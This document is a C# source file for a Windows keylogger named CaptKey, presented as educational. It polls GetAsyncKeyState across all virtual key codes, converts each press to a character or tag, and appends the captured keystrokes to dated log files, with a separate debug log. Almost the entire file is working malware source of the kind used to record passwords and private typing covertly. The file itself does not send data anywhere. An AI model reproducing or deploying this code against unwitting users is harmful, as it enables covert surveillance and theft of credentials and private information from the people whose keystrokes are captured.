/*
This keylogger is to be used for educational purposes.  

Shout out to the below References:
https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
https://hackmag.com/coding/diy-keylogger/

*/


using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace CaptKey
{
    static class Program
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        static string convertChar(int k)
        {
            char aChar;
            string aString = ""; 
            
            aChar = Convert.ToChar(k);
            aString = aChar.ToString();
            return aString;
        }

        [STAThread]
        static void Main()
        {
           string keydebug = "";    // Information written to the debug log for enhancing it
           string keybuf = "";      // Keys Pressed and Buffered for Output
           string keyconv = "";     // ASCII Key Pressed Converted
           string logfileName;
           string debugfileName;
           //char asciiChar;
           while (true)
           {
               Thread.Sleep(50);            // Adjust this value depending on how fast someone types - Does introduce latency on the CPU if set to low...
               for (int i = 0; i < 255; i++)
               {
                   int state = GetAsyncKeyState(i);
                   // -32767 indicates that a key was pressed
                   keyconv = "";
                   if (state == -32767) {
                       // Numbers 0-9
                       if ((i >= 48) && (i <= 57)) {          
                           keyconv = convertChar(i);
                           keybuf += keyconv;
                       }
                       // Uppercase letters A-Z
                       else if ((i >= 65) && (i <= 90)) {          
                           keyconv = convertChar(i);
                           keybuf += keyconv;
                       }
                       // Lowercase letters a-z
                       else if ((i >= 97) && (i <= 122)) {          
                           keyconv = convertChar(i);
                           keybuf += keyconv;
                       }
                       else {
                           switch (i)
                           {
                                case 1:
                                    keyconv = "<lmouse>";
                                    keybuf += keyconv;
                                    break;
                                case 2:
                                    keyconv = "<rmouse>";
                                    keybuf += keyconv;
                                    break;
                                case 8:
                                    keyconv = "<backspace>";
                                    keybuf += keyconv;
                                    break;
                                case 9:
                                    keyconv = "<tab>";
                                    keybuf += keyconv;
                                    break;
                                case 13:
                                    keyconv = "\r\n";
                                    keybuf += keyconv;
                                    break;
                                case 18:
                                    keyconv = "<alt>";
                                    keybuf += keyconv;
                                    break;
                                case 20:
                                    keyconv = "<caps>";
                                    keybuf += keyconv;
                                    break;
                                case 27:
                                    keyconv = "<esc>";
                                    keybuf += keyconv;
                                    break;
                                case 32:
                                    keyconv = " ";  // Spacebar
                                    keybuf += keyconv;
                                    break;
                                case 33:
                                    keyconv = "<pageup>";
                                    keybuf += keyconv;
                                    break;
                                case 34:
                                    keyconv = "<pagedown>";
                                    keybuf += keyconv;
                                    break;
                                case 35:
                                    keyconv = "<end>";
                                    keybuf += keyconv;
                                    break;
                                case 36:
                                    keyconv = "<home>";
                                    keybuf += keyconv;
                                    break;
                                case 37:
                                    keyconv = "<left>";
                                    keybuf += keyconv;
                                    break;
                                case 38:
                                    keyconv = "<up>";
                                    keybuf += keyconv;
                                    break;
                                case 39:
                                    keyconv = "<right>";
                                    keybuf += keyconv;
                                    break;
                                case 40:
                                    keyconv = "<down>";
                                    keybuf += keyconv;
                                    break;
                                case 44:
                                    keyconv = "<printscreen>";
                                    keybuf += keyconv;
                                    break;
                                case 45:
                                    keyconv = "<insert>";
                                    keybuf += keyconv;
                                    break;
                                case 46:
                                    keyconv = "<del>";
                                    keybuf += keyconv;
                                    break;
                                case 91:  //0x5b
                                    keyconv = "<lwinkey>";
                                    keybuf += keyconv;
                                    break;
                                case 92:
                                    keyconv = "<rwinkey>";
                                    keybuf += keyconv;
                                    break;
                                case 96: //0x60
                                    keyconv = "0";
                                    keybuf += keyconv;
                                    break;
                                case 97:
                                    keyconv = "1";
                                    keybuf += keyconv;
                                    break;
                                case 98:
                                    keyconv = "2";
                                    keybuf += keyconv;
                                    break;
                                case 99:
                                    keyconv = "3";
                                    keybuf += keyconv;
                                    break;
                                case 100:
                                    keyconv = "4";
                                    keybuf += keyconv;
                                    break;
                                case 101:
                                    keyconv = "5";
                                    keybuf += keyconv;
                                    break;
                                case 102:
                                    keyconv = "6";
                                    keybuf += keyconv;
                                    break;
                                case 103:
                                    keyconv = "7";
                                    keybuf += keyconv;
                                    break;
                                case 104:
                                    keyconv = "8";
                                    keybuf += keyconv;
                                    break;
                                case 105:
                                    keyconv = "9";
                                    keybuf += keyconv;
                                    break;
                                case 106:
                                    keyconv = "<*>";
                                    keybuf += keyconv;
                                    break;
                                case 107:
                                    keyconv = "<+>";
                                    keybuf += keyconv;
                                    break;
                                case 160:
                                    keyconv = "<lshift>";
                                    keybuf += keyconv;
                                    break;
                                case 161:
                                    keyconv = "<rshift>";
                                    keybuf += keyconv;
                                    break;
                                case 162:
                                    keyconv = "<lctrl>";
                                    keybuf += keyconv;
                                    break;
                                case 163:
                                    keyconv = "<rctrl>";
                                    keybuf += keyconv;
                                    break;
                                case 186:
                                    keyconv = "<semicolon>";
                                    keybuf += keyconv;
                                    break;
                                case 187:
                                    keyconv = "<plus>";
                                    keybuf += keyconv;
                                    break;
                                case 188:
                                    keyconv = "<comma>";
                                    keybuf += keyconv;
                                    break;
                                case 189:
                                    keyconv = "<minus>";
                                    keybuf += keyconv;
                                    break;
                                case 190:
                                    keyconv = "<period>";
                                    keybuf += keyconv;
                                    break;
                                case 191:
                                    keyconv = "<question>";
                                    keybuf += keyconv;
                                    break;
                                case 219:
                                    keyconv = "<lbracket>";
                                    keybuf += keyconv;
                                    break;
                                case 220:
                                    keyconv = "<backslash>";
                                    keybuf += keyconv;
                                    break;
                                case 221:
                                    keyconv = "<rbracket>";
                                    keybuf += keyconv;
                                    break;
                                case 222:
                                    keyconv = "<singlequote>";
                                    keybuf += keyconv;
                                    break;
                                case 3:
                                case 4:
                                case 5:
                                case 6:
                                case 7:
                                case 10:
                                case 11:
                                case 12:
                                case 16:
                                case 17:
                                case 21:
                                case 22:
                                case 23:
                                case 24:
                                case 25:
                                case 26:
                                    // 16 is the shift key (160 and 161 should be referenced)
                                    // 17 os the ctrl key (162 and 163 should be referenced)
                                    keyconv = "<na>";
                                    //keybuf += keyconv;
                                    break;
                                default:
                                    keyconv = "\r\nKeyBuf: " + i.ToString() + "\r\n";
                                    keybuf += keyconv;
                                    break;
                           }
                       }
                       
                       if (keyconv == "") {
                           keydebug += "State: " + state.ToString() + " -- KeyDebug: " + i.ToString() + "\r\n";
                       }
                       else {
                           keydebug += "State: " + state.ToString() + " -- KeyDebug: " + i.ToString() + " -- ASCII: " + keyconv + "\r\n";
                       }
                       
                   }
                   else if (state != 0)              // -32767 Key was pressed
                   {
                       keydebug += "State: " + state.ToString() + " -- KeyDebug: " + i.ToString() + "\r\n";
                   }


                   // Write out to a file the keys buffered
                   if (keybuf.Length > 50)
                   {
                        DateTime today = DateTime.Now;
                        logfileName = "log_" + today.ToString("MMddyyyy") + ".txt";
                        keybuf = "\r\n\r\n[" + today.ToString() + "]\r\n" + keybuf;
                        File.AppendAllText(logfileName, keybuf);
                        keybuf = "";
                   }
                   // Write out to the debug file for enhancements
                   if (keydebug.Length > 250)
                   {
                        DateTime today = DateTime.Now;
                        debugfileName = "debug_" + today.ToString("MMddyyyy") + ".txt";
                        keydebug = "\r\n\r\n[" + today.ToString() + "]\r\n" + keydebug;
                        File.AppendAllText(debugfileName, keydebug);
                        keydebug = "";
                   }
               }
           }
        }
    }
}

